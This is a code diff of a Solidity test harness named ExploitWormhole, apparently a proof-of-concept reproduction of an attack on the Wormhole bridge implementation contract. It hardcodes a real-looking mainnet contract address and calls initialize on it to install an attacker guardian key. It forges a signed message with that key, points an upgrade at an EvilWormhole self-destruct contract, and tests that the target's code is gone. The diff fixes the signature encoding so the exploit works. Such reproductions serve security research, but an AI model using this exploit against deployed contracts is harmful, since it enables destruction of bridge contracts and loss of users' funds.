@@ -63,9 +63,9 @@ contract Destructor {
 contract ExploitWormhole is TestHarness {  
 
     IWormholeImpl internal wormholeImpl = IWormholeImpl(0x736D2A394f7810C17b3c6fEd017d5BC7D60c077d);
-    uint256 attackerPrivateKey = 0xc0479a156312b6dc9601a068620b58e184ec16f72eaf7481cdcc94fa9affbb68;
+    uint256 attackerPrivateKey = 0xd0bbd8230a18b0b51c4934271cb8f6a9638ab171a7c6d570777b14c0ed58a5a1;
     uint256[] attackerKeys = [attackerPrivateKey];
-    address internal attacker = address(0x94bc9eb378Ccc7Dcf7C2c1DeCF9E60659635FCC5);
+    address internal attacker = address(0x0c2C6C607128e2221f237d6b53479b99c9B8882c);
     address[] attackerAddresses = [attacker];
     EvilWormhole evilWormhole;
 
@@ -83,11 +83,6 @@ contract ExploitWormhole is TestHarness {
       bytes memory vm;
       bytes32 hash;
       bytes memory signatures;
-      /*
-      bytes memory hash = hex'2cbb8dc35cf56e1290f53431a4effde8d5a1b3ad81556ad796f165fad9a6f485'; // to be replaced with actual body of input variables
-      bytes memory vm = hex'0100000000010038322b62e2690319cc2323565aa999d14a05a72f6500a014f3ad7728f77b146c7c6859db43fb993ddfbefb4d5302d5bf2a8aad6999340511a6a57196e8fdd6230100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000436f72650100000000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f';
-      */
-
       bytes memory body = abi.encodePacked(
                                 uint32(timestamp),
                                 uint32(nonce),
@@ -97,26 +92,17 @@ contract ExploitWormhole is TestHarness {
                                 uint8(consistencyLevel),
                                 bytes(data)
       );
-      console.log("BODY");
-      console.logBytes(body);
 
       hash = keccak256(abi.encodePacked(keccak256(body)));
-
-      // they are signing as... need equivalent in solidity, if not see offchain solution
-      // const ec = new elliptic.ec("secp256k1");
-      // const key = ec.keyFromPrivate(signers[i]);
-      // const signature = key.sign(hash.substr(2), {canonical: true});
       (uint8 v, bytes32 r, bytes32 s) = cheat.sign(attackerPrivateKey, hash);
-      
+      uint8 recoveryParam = ((v - 27) != 0) ? 1 : 0;
+
       signatures = abi.encodePacked(
                         uint8(0), // index - single signature
                         bytes32(r),
                         bytes32(s),
-                        uint8(v) // for some reason they are referencing this as uint8(1), not actual v value (0x1b|27)
+                        uint8(recoveryParam)
       );
-
-      console.log("SIGNATURES");
-      console.logBytes(signatures);
 
       vm = abi.encodePacked(
                   uint8(1),
@@ -126,8 +112,6 @@ contract ExploitWormhole is TestHarness {
                   body
       );
 
-      console.log("VM");
-      console.logBytes(vm);
       return vm;
     }
 
@@ -184,7 +168,7 @@ contract ExploitWormhole is TestHarness {
         vm.payload = BytesLib.slice(encodedVM, index, encodedVM.length - index);
     }
 
-    function codeSize(address addr) internal returns (uint) {
+    function codeSize(address addr) internal view returns (uint) {
         uint size;
 
         assembly {
@@ -193,7 +177,7 @@ contract ExploitWormhole is TestHarness {
         return size;
     }
 
-    function dumpCode(address addr, uint size) internal {
+    function dumpCode(address addr, uint size) internal view {
         bytes memory bytecode;
         
         if (size >= 32)
@@ -206,13 +190,12 @@ contract ExploitWormhole is TestHarness {
         console.log("");
     }
 
-    function buildPayload(address target) internal returns (bytes memory) {
+    function buildPayload(address target) internal pure returns (bytes memory) {
         bytes memory STUB = hex'00000000000000000000000000000000000000000000000000000000436f726501';
         bytes memory addressEncoded = abi.encodePacked(
                                 uint112(0),
                                 address(target)
         );
-        console.logBytes(addressEncoded);
         bytes memory payload = BytesLib.concat(STUB, addressEncoded);
 
         return payload;
@@ -239,8 +222,6 @@ contract ExploitWormhole is TestHarness {
         wormholeImpl.initialize(attackerAddresses, 0, 0, HASH_ZERO);
 
         bytes memory payload = buildPayload(address(evilWormhole));
-        console.log("Payload");
-        console.logBytes(payload);
         _vm = signAndEncodeVM(
                 0,
                 0,
@@ -260,12 +241,11 @@ contract ExploitWormhole is TestHarness {
     }
 
     function test_attack() external {
-      /*
+
         address addr = address(wormholeImpl);
         uint size = codeSize(addr);
 
         dumpCode(addr, size);
         assertEq(size, 0);
-        */
     }
 }
